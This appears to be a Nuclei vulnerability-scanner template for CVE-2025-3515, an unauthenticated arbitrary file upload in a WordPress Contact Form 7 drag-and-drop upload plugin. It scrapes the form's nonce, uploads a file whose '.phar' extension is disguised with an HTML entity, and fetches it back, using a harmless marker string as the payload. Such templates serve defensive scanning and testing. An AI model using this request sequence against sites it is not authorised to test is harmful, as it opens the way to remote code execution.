id: CVE-2025-3515

info:
  name: Contact Form 7 Drag and Drop Multiple File Upload - Arbitrary File Upload
  author: hnd3884
  severity: High
  description: |
    The Drag and Drop Multiple File Upload for Contact Form 7 plugin for WordPress (versions up to and including 1.3.8.9) is vulnerable to arbitrary file upload due to insufficient file type validation. An unauthenticated attacker can bypass the plugin's blacklist to upload dangerous file types such as `.phar`, which may allow remote code execution on servers (e.g., Apache + mod_php) that treat these files as executable scripts.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-3515
    - https://plugins.trac.wordpress.org/changeset/3310153/
    - https://www.wordfence.com/threat-intel/vulnerabilities/id/e1298242-61d2-495e-bae7-96b5e12bd03d
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.1
    cve-id: CVE-2025-3515
    cwe-id: CWE-434
    epss-score: 0.00115
    cpe: cpe:2.3:a:codedropz:drag_and_drop_multiple_file_upload_-_contact_form_7:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: codedropz
    product: drag_and_drop_multiple_file_upload_contact_form_7
  tags: cve,cve2025,wordpress,contact-form-7,file-upload,php

variables:
  PHAR_BODY: "phar content"

http:
  - id: fetch-upload-name
    method: GET
    path:
      - "{{BaseURL}}/?page_id=2"
    matchers:
      - type: word
        words:
          - "wpcf7-drag-n-drop-file d-none"
        part: body
        internal: true

    extractors:
      - type: regex
        name: upload_name
        group: 1
        regex:
          - '<input.+?class=".+?wpcf7-drag-n-drop-file d-none.+?".+?data-name="(.+?)"'
        internal: true
      - type: regex
        name: nonce
        group: 1
        regex:
          - '"ajax_nonce":"([a-f0-9]{10,})"'
        internal: true
      - type: regex
        name: form_id
        group: 1
        regex:
          - '<input.+?class=".+?wpcf7-drag-n-drop-file d-none.+?".+?data-id="([0-9]+?)"'
        internal: true

  - id: upload-file
    method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"
    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryyvcxCgWuFH6hBJi4
    body: |
      ------WebKitFormBoundaryyvcxCgWuFH6hBJi4
      Content-Disposition: form-data; name="action"

      dnd_codedropz_upload
      ------WebKitFormBoundaryyvcxCgWuFH6hBJi4
      Content-Disposition: form-data; name="type"

      drop
      ------WebKitFormBoundaryyvcxCgWuFH6hBJi4
      Content-Disposition: form-data; name="security"

      {{nonce}}
      ------WebKitFormBoundaryyvcxCgWuFH6hBJi4
      Content-Disposition: form-data; name="form_id"

      {{form_id}}
      ------WebKitFormBoundaryyvcxCgWuFH6hBJi4
      Content-Disposition: form-data; name="upload_name"

      {{upload_name}}
      ------WebKitFormBoundaryyvcxCgWuFH6hBJi4
      Content-Disposition: form-data; name="upload_folder"

      xxx
      ------WebKitFormBoundaryyvcxCgWuFH6hBJi4
      Content-Disposition: form-data; name="upload-file"; filename="poc.&#112;har"
      Content-Type: image/png

      {{PHAR_BODY}}
      ------WebKitFormBoundaryyvcxCgWuFH6hBJi4--
    matchers:
      - type: word
        words:
          - '"success":true'
        part: body
        internal: true
      - type: status
        status:
          - 200
        internal: true

    extractors:
      - type: json
        name: uploaded_file
        json:
          - ".data.file"
        internal: true
    matchers-condition: and

  - id: fetch-phar-file
    method: GET
    path:
      - "{{BaseURL}}/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/{{uploaded_file}}"
    matchers:
      - type: word
        words:
          - "{{PHAR_BODY}}"
        part: body
      - type: status
        status:
          - 200
        internal: true
    matchers-condition: and
    extractors:
      - type: dsl
        dsl:
          - "uploaded_file"
